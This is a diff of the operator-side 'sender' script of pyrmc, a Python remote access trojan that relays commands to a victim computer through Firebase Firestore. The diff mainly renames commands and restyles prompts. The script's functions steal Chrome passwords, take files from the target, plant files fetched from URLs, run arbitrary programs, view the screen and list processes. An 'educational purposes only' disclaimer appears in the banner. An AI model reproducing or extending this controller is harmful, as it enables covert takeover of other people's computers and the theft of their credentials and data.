@@ -16,12 +16,13 @@ cred = credentials.Certificate("storage/cred.json")
 firebase_admin.initialize_app(cred)
 db = firestore.client()
 
-logo = text2art('PYRMC - [SENDER]')
-print(Fore.GREEN + logo)
-print(Fore.YELLOW + '------------------------------------------------------ pyrmc - python remote controller -------')
+logo = text2art('/ pyrmc')
+print(Fore.LIGHTMAGENTA_EX + logo)
+print(Fore.LIGHTBLACK_EX + '--------------' + Fore.LIGHTMAGENTA_EX + ' type help for command list ' + Fore.LIGHTBLACK_EX + '-------')
 spacebreak()
-print(Fore.YELLOW + 'now on [sender.py]' + Fore.CYAN + ' [hackers machine]')
-spacebreak()
+time.sleep(1)
+print(Fore.MAGENTA + 'pyrmc is a remote access trojan tool built using firebase and python \nthis tool was made for educational purposes only \nplease refrain from using pyrmc for malicious purposes \nthe writer of this script is not responsible for what you use it for.')
+time.sleep(2)
 
 
 def write_to_firestore(collection_name, data):
@@ -41,10 +42,8 @@ def listen_to_output():
             doc_time = doc.create_time.timestamp()
             if current_time - doc_time <= 3:
                 output_data = doc.to_dict()
-                print(Fore.GREEN + "[+]" + Fore.LIGHTGREEN_EX + " Output received:" + Fore.YELLOW)
-                spacebreak()
-                print(output_data["output"])
-                spacebreak()
+                # output recieved text can get put here... (print(recieved)) if ykyk i dont want it tho
+                print(Fore.LIGHTBLACK_EX + "output >> " + Fore.LIGHTMAGENTA_EX + output_data["output"]) #prints output
                 return True
         # If no recent output found, wait for 1 second before checking again
         if time.time() - start_time > 11:
@@ -62,185 +61,185 @@ def edit_txtfile():
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 
 def get_pcinfo():
     data = {
-        "command": "get.pcinfo"
+        "command": "!pcinfo"
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 
 def get_chrome_passwords():
     data = {
-        "command": "get.chromepasswords"
+        "command": "!chromepasswords"
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 
 def import_file_to_dir():
-    file_link = input(Fore.GREEN + "import file?" + Fore.RED + " (has to be a URL! docs for more info) >> " + Fore.YELLOW)
-    directory = input(Fore.GREEN + "import file to dir? >> " + Fore.YELLOW)
+    file_link = input(Fore.LIGHTBLACK_EX + "import file, file has to be hosted on url >> " + Fore.LIGHTMAGENTA_EX)
+    directory = input(Fore.LIGHTBLACK_EX+ "directory to import file to >> " + Fore.LIGHTMAGENTA_EX)
     data = {
-        "command": "os.import",
+        "command": "!import",
         "file_link": file_link,
         "directory": directory
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 
 def play_sound():
-    sound_dir = input(Fore.GREEN + "dir of sound to be played ?" + Fore.RED + " (has to be on victims PC! use os.import to import file to pc) >> " + Fore.YELLOW)
+    sound_dir = input(Fore.LIGHTBLACK_EX + "path to the sound file, has to be on users system >> " + Fore.LIGHTMAGENTA_EX)
     data = {
-        "command": "os.playsound",
+        "command": "!playsound",
         "sounddir": sound_dir
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 
 def view_screen():
     data = {
-        "command": "os.sharescreen"
+        "command": "!viewscreen"
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 def ls_storage():
     data = {
-        "command": "ls.storage"
+        "command": "!ls.storage"
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 def ls_command():
-    directory = input(Fore.GREEN + "ls[directory]" + Fore.RED + " (ls and the directory on the targets computer) >> " + Fore.YELLOW)
+    directory = input(Fore.LIGHTBLACK_EX + "list files in which directory >> " + Fore.LIGHTMAGENTA_EX)
     data = {
-        "command": "ls",
+        "command": "!ls",
         "lsdirectory": directory
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 
 def export_file_or_folder():
-    export_path = input(Fore.GREEN + "export file/folder?" + Fore.RED + " (specify the path to export from) >> " + Fore.YELLOW)
+    export_path = input(Fore.LIGHTBLACK_EX + "download path >> " + Fore.LIGHTMAGENTA_EX)
     data = {
-        "command": "os.export",
+        "command": "!download",
         "exportpath": export_path
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 def display_image():
-    img_path = input(Fore.GREEN + "enter the path of the image to display >> " + Fore.YELLOW)
+    img_path = input(Fore.LIGHTBLACK_EX + "path to image >> " + Fore.LIGHTMAGENTA_EX)
     data = {
-        "command": "os.displayimage",
+        "command": "!displayimage",
         "imgpath": img_path
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 def display_video():
-    vid_path = input(Fore.GREEN + "enter the path of the video to display >> " + Fore.YELLOW)
+    vid_path = input(Fore.LIGHTBLACK_EX + "path to video >> " + Fore.LIGHTMAGENTA_EX)
     data = {
-        "command": "os.displayvideo",
+        "command": "!displayvideo",
         "vidpath": vid_path
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 def get_processes():
     data = {
-        "command": "get.processes"
+        "command": "!processes"
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently Active or Target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 def run_task():
-    task_path = input(Fore.GREEN + "enter the path of task to run >> " + Fore.YELLOW)
+    task_path = input(Fore.LIGHTBLACK_EX + "path of task to run >> " + Fore.LIGHTMAGENTA_EX)
     data = {
-        "command": "os.runtask",
+        "command": "!run",
         "runpath": task_path
     }
     write_to_firestore("commands", data)
     spacebreak()
-    print(Fore.GREEN + "[+]" + Fore.CYAN + " Command successfully sent to Firebase Firestore" + Fore.YELLOW + ", Waiting for Output Response...")
+    print(Fore.LIGHTBLACK_EX + ">>" + Fore.MAGENTA + " command successfully sent to firestore, waiting for Output Response...")
     if not listen_to_output():
-        print(Fore.RED + "[ERROR] No output was created. This could be because Receiver is not currently active or the target's computer is off.")
+        print(Fore.LIGHTBLACK_EX + "output not created, the targets computer is probably switched off")
 
 def main():
     while True:
         spacebreak()
-        command = input(Fore.GREEN + "PYRMC [SENDER] >> " + Fore.LIGHTGREEN_EX)
+        command = input(Fore.LIGHTBLACK_EX + "command >> " + Fore.LIGHTMAGENTA_EX)
         if command.startswith("edit.txtfile"):
             edit_txtfile()
-        elif command.strip() == "get.pcinfo":
+        elif command.strip() == "!pcinfo":
             get_pcinfo()
-        elif command.strip() == "get.chromepasswords":
+        elif command.strip() == "!chromepasswords":
             get_chrome_passwords()
-        elif command.strip() == "get.processes":
+        elif command.strip() == "!processes":
             get_processes()
-        elif command.startswith("os.import"):
+        elif command.startswith("!import"):
             import_file_to_dir()
-        elif command.startswith("os.export"):
+        elif command.startswith("!download"):
             export_file_or_folder()
-        elif command.startswith("os.playsound"):
+        elif command.startswith("!playsound"):
             play_sound()
-        elif command.strip() == "os.sharescreen":
+        elif command.strip() == "!viewscreen":
             view_screen()
-        elif command.strip() == "os.displayimage":
+        elif command.strip() == "!displayimage":
             display_image()
-        elif command.strip() == "os.displayvideo":
+        elif command.strip() == "!displayvideo":
             display_video()
-        elif command.startswith("os.runtask"):
+        elif command.startswith("!run"):
             run_task()
-        elif command.strip() == "ls":
+        elif command.strip() == "!ls":
             ls_command()
-        elif command.strip() == "ls.storage":
+        elif command.strip() == "!ls.storage":
             ls_storage()
         else:
             spacebreak()
-            print(Fore.RED + "[+] Command not recognized, check docs for list of commands.")
+            print(Fore.LIGHTBLACK_EX + "error >> command not recognized")
 
 
 
